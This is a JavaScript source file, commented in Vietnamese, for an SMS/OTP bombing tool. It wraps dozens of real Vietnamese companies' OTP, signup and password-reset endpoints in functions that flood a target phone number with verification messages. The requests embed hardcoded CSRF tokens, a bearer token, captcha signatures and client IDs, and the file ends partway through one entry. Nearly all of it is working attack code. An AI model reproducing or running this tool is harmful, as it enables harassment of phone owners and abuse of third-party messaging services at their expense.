// spam.js - Giữ nguyên toàn bộ API từ tool gốc, chỉ chuyển sang JS
(function() {
    // ----- QUẢN LÝ NHẠC -----
    const audio = document.getElementById('bgMusic');
    const playBtn = document.getElementById('playBtn');
    let isPlaying = false;

    document.addEventListener('click', function initAudio() {
        if (!isPlaying) {
            audio.play().catch(() => {});
            isPlaying = true;
            playBtn.innerHTML = '<i class="fas fa-pause"></i>';
        }
        document.removeEventListener('click', initAudio);
    }, { once: true });

    playBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        if (isPlaying) {
            audio.pause();
            isPlaying = false;
            playBtn.innerHTML = '<i class="fas fa-play"></i>';
        } else {
            audio.play().catch(() => {});
            isPlaying = true;
            playBtn.innerHTML = '<i class="fas fa-pause"></i>';
        }
    });

    // ----- LOG & UI -----
    const statusBox = document.getElementById('statusBox');
    const phoneInput = document.getElementById('phoneInput');
    const countInput = document.getElementById('countInput');
    const startBtn = document.getElementById('startBtn');
    const clearBtn = document.getElementById('clearBtn');
    const stopBtn = document.getElementById('stopBtn');
    let running = false;
    let stopRequested = false;

    function addLog(msg, type = 'info') {
        const time = new Date().toLocaleTimeString('vi-VN');
        const div = document.createElement('div');
        div.className = 'status-item';
        let cls = 'info';
        if (type === 'success') cls = 'success';
        else if (type === 'fail') cls = 'fail';
        div.innerHTML = `<span class="time">[${time}]</span><span class="msg ${cls}">${msg}</span>`;
        statusBox.appendChild(div);
        statusBox.scrollTop = statusBox.scrollHeight;
        while (statusBox.children.length > 200) {
            statusBox.removeChild(statusBox.firstChild);
        }
    }

    clearBtn.addEventListener('click', function() {
        statusBox.innerHTML = '';
        addLog('Đã xóa log', 'info');
    });

    stopBtn.addEventListener('click', function() {
        stopRequested = true;
        running = false;
        addLog('⏹️ Dừng theo yêu cầu', 'fail');
    });

    // ----- DANH SÁCH API SPAM (GIỮ NGUYÊN TỪ TOOL GỐC) -----
    // Tất cả các hàm send_otp_via_* đã được chuyển sang JS, giữ nguyên endpoint, headers, payload
    const spamFunctions = [
        // send_otp_via_sapo
        (phone) => fetch('https://www.sapo.vn/fnb/sendotp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'phonenumber=' + encodeURIComponent(phone)
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_viettel
        (phone) => fetch('https://viettel.vn/api/getOTPLoginCommon', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone, typeCode: 'DI_DONG', actionCode: 'myviettel://login_mobile', type: 'otp_login' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_medicare
        (phone) => fetch('https://medicare.vn/api/otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ mobile: phone, mobile_country_prefix: '84' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_tv360
        (phone) => fetch('https://tv360.vn/public/v1/auth/get-otp-login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ msisdn: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_dienmayxanh
        (phone) => fetch('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'phoneNumber=' + encodeURIComponent(phone) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_kingfoodmart
        (phone) => fetch('https://api.onelife.vn/v1/gateway/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ operationName: 'SendOtp', variables: { input: { phone: phone, captchaSignature: 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD' } }, query: 'mutation SendOtp($input: SendOtpInput!) { sendOtp(input: $input) { otpTrackingId __typename } }' })
        }).then(r => r.text()).then(t => t.includes('otpTrackingId') ? 'OK' : 'FAIL'),

        // send_otp_via_mocha
        (phone) => fetch('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn=' + encodeURIComponent(phone) + '&languageCode=vi', {
            method: 'POST',
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_fptdk
        (phone) => fetch('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_fptmk
        (phone) => fetch('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_VIEON
        (phone) => fetch('https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ username: phone, country_code: 'VN', model: 'Windows 10', device_id: 'f812a55d1d5ee2b87a927833df2608bc', device_name: 'Edge/127', device_type: 'desktop', platform: 'web', ui: '012021' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_ghn
        (phone) => fetch('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone, type: 'register' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_lottemart
        (phone) => fetch('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ username: phone, case: 'register' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_DONGCRE
        (phone) => fetch('https://api.vayvnd.vn/v2/users/password-reset', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'site-id': '3' },
            body: JSON.stringify({ login: phone, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_shopee
        (phone) => fetch('https://shopee.vn/api/v4/otp/get_settings_v2', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs' },
            body: JSON.stringify({ operation: 8, encrypted_phone: '', phone: phone, supported_channels: [1,2,3,6,0,5], support_session: true })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_TGDD
        (phone) => fetch('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'phoneNumber=' + encodeURIComponent(phone) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_fptshop
        (phone) => fetch('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ fromSys: 'WEBKHICT', otpType: '0', phoneNumber: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_WinMart
        (phone) => fetch('https://api-crownx.winmart.vn/iam/api/v1/user/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ firstName: 'Nguyen Quang Ngoc', phoneNumber: phone, masanReferralCode: '', dobDate: '2024-07-26', gender: 'Male' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_vietloan
        (phone) => fetch('https://vietloan.vn/register/phone-resend', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'phone=' + encodeURIComponent(phone) + '&_token=XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_lozi
        (phone) => fetch('https://mocha.lozi.vn/v1/invites/use-app', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ countryCode: '84', phoneNumber: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_F88
        (phone) => fetch('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ FullName: 'Nguyen Van A', Phone: phone, DistrictCode: '024', ProvinceCode: '02', AssetType: 'Car', IsChoose: '1', ShopCode: '', Url: 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan', FormType: 1 })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_spacet
        (phone) => fetch('https://api.spacet.vn/www/user/phone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YThmYjYyNGZjMmJjMTk4MGNjMmQwYyIsInRva2VuSWQiOiI2NmE4ZmI2MjRmYzJiYzE5ODBjYzJkMmQiLCJpYXQiOjE3MjIzNTA0MzR9.aF4K1s9PlYsEm02V_TIeyCwkdDVdol1ZxcbokSQekYA' },
            body: JSON.stringify({ phone: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_vinpearl
        (phone) => fetch('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ channel: 'vpt', username: phone, type: 1, OtpChannel: 1 })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_traveloka
        (phone) => {
            let p = phone;
            if (p.startsWith('09')) p = '+84' + p.substring(1);
            return fetch('https://www.traveloka.com/api/v2/user/signup', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                body: JSON.stringify({ fields: [], data: { userLoginMethod: 'PN', username: p }, clientInterface: 'desktop' })
            }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL');
        },

        // send_otp_via_dongplus
        (phone) => fetch('https://api.dongplus.vn/api/v2/user/check-phone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ mobile_phone: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_longchau
        (phone) => fetch('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phoneNumber: phone, otpType: 0, fromSys: 'WEBKHLC' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_longchau1
        (phone) => fetch('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phoneNumber: phone, otpType: 1, fromSys: 'WEBKHLC' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_galaxyplay
        (phone) => fetch('https://api.glxplay.io/account/phone/checkPhoneOnly?phone=' + encodeURIComponent(phone), {
            method: 'POST',
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_emartmall
        (phone) => fetch('https://emartmall.com.vn/index.php?route=account/register/smsRegister', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'mobile=' + encodeURIComponent(phone)
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_ahamove
        (phone) => fetch('https://api.ahamove.com/api/v3/public/user/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ mobile: phone, country_code: 'VN', firebase_sms_auth: true })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_ViettelMoney
        (phone) => fetch('https://api8.viettelpay.vn/customer/v2/accounts/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Viettel Money/8.8.8' },
            body: JSON.stringify({ identityType: 'msisdn', identityValue: phone, type: 'REGISTER' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_xanhsmsms
        (phone) => {
            let p = phone;
            if (p.startsWith('09') || p.startsWith('03')) p = '+84' + p.substring(1);
            return fetch('https://api.gsm-api.net/auth/v1/public/otp/send?aud=user_app&platform=ios', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'User-Agent': 'UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2)' },
                body: JSON.stringify({ is_forgot_password: false, phone: p, provider: 'VIET_GUYS' })
            }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL');
        },

        // send_otp_via_xanhsmzalo
        (phone) => {
            let p = phone;
            if (p.startsWith('09') || p.startsWith('03')) p = '+84' + p.substring(1);
            return fetch('https://api.gsm-api.net/auth/v1/public/otp/send?aud=user_app&platform=ios', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'User-Agent': 'UserApp/3.15.0' },
                body: JSON.stringify({ is_forgot_password: false, phone: p, provider: 'ZNS_ZALO' })
            }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL');
        },

        // send_otp_via_popeyes
        (phone) => fetch('https://api.popeyes.vn/api/v1/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone, firstName: 'Nguyen', lastName: 'Ngoc', email: 'test@mail.com', password: 'test123' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_ACHECKIN
        (phone) => fetch('https://id.acheckin.vn/api/graphql/v2/mobile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'AppotaHome/29 CFNetwork/1474 Darwin/23.0.0' },
            body: JSON.stringify({ operationName: 'RequestVoiceOTP', variables: { phone_number: phone, action: 'REGISTER', hash: '6af5e4ed78ee57fe21f0d405c752798f' }, query: 'mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) { requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash) }' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_Watsons
        (phone) => fetch('https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep?lang=vi', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'WTCVN/24050.8.0 (iOS/17.0.2)' },
            body: JSON.stringify({ otpTokenRequest: { action: 'REGISTRATION', type: 'SMS', countryCode: '84', target: phone }, defaultAddress: { mobileNumberCountryCode: '84', mobileNumber: phone }, mobileNumber: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_hoangphuc
        (phone) => fetch('https://hoang-phuc.com/advancedlogin/otp/sendotp/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'action_type=1&tel=' + encodeURIComponent(phone)
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_fmcomvn
        (phone) => fetch('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ Phone: phone, LatOfMap: '106', LongOfMap: '108', Browser: '' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_Reebokvn
        (phone) => fetch('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phoneNumber: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_thefaceshop
        (phone) => fetch('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phoneNumber: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_BEAUTYBOX
        (phone) => fetch('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phoneNumber: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_futabus
        (phone) => fetch('https://api.vato.vn/api/authenticate/request_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phoneNumber: phone, deviceId: 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed', use_for: 'LOGIN' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_ViettelPost
        (phone) => fetch('https://id.viettelpost.vn/Account/SendOTPByPhone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'FormRegister.FullName=Nguyen+Quang+Ngoc&FormRegister.Phone=' + encodeURIComponent(phone) + '&FormRegister.Password=test123&FormRegister.ConfirmPassword=test123&ReturnUrl=/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt&ConfirmOtpType=Register&FormRegister.IsRegisterFromPhone=true&__RequestVerificationToken=CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_myviettel2
        (phone) => fetch('https://viettel.vn/api/get-otp-contract-mobile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ msisdn: phone, type: 'register' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_myviettel3
        (phone) => fetch('https://viettel.vn/api/get-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ msisdn: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_TOKYOLIFE
        (phone) => fetch('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone_number: phone, name: 'Nguyen Quang Ngoc', password: 'test123', email: 'test@mail.com', birthday: '2002-03-12', gender: 'male' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_30shine
        (phone) => fetch('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_Cathaylife
        (phone) => fetch('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'memberMap=' + encodeURIComponent('{"userName":"test@mail.com","password":"test123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"' + phone + '","email":"test@mail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyen Quang Ngoc"}') + '&OTP_TYPE=P&LANGS=vi_VN'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_dominos
        (phone) => fetch('https://dominos.vn/api/v1/users/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone_number: phone, email: 'test@mail.com', type: 0, is_register: true })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_vinamilk
        (phone) => fetch('https://new.vinamilk.com.vn/api/account/getotp', {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ type: 'register', phone: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_batdongsan
        (phone) => fetch('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + encodeURIComponent(phone), {
            method: 'GET',
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_GUMAC
        (phone) => fetch('https://cms.gumac.vn/api/v1/customers/verify-phone-number', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_FAHASA
        (phone) => fetch('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'phone=' + encodeURIComponent(phone)
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_hopiness
        (phone) => fetch('https://shopiness.vn/ajax/user', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'X-Requested-With': 'XMLHttpRequest' },
